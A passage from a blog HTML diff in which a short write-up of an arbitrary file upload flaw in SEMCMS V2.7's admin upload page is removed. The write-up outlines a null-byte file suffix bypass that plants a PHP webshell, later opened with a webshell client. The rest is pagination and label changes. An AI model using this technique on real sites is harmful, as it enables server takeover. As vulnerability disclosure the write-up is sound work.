-<p>The affected page located in admin’s management page:<code>ciuy_Admin/SEMCMS_Upfile.php</code></p>
-<h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>First,we define our evil php’s suffix as test.rar(which is allowed) and post it as follow.There,we could see no files in the Folder</p>
-<p>Second,we change the php as php0x00 and the effection as :<br><img src="https://i.loli.net/2018/08/23/5b7e13304a88d.png" alt></p>
-<p>final effection and poc:<br><img src="https://i.loli.net/2018/08/23/5b7e13ba8c3e3.jpg" alt><br><img src="https://i.loli.net/2018/08/23/5b7e141646860.jpg" alt></p>
-<p>Then, we could see the test.php in the folder:<br><img src="https://i.loli.net/2018/08/23/5b7e142f6dfac.png" alt></p>
-<p>Finally, we could use tools (Cknife) to link the evil php<br><img src="https://i.loli.net/2018/08/23/5b7e147a46853.png" alt></p>
-<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>This is a background getshell process. The required PHP version is less than 5.3</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/23/Arbitrary File upload in Semcms V2.7/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1179,7 +1384,7 @@ xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/3/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
   </nav>
 
     </main>
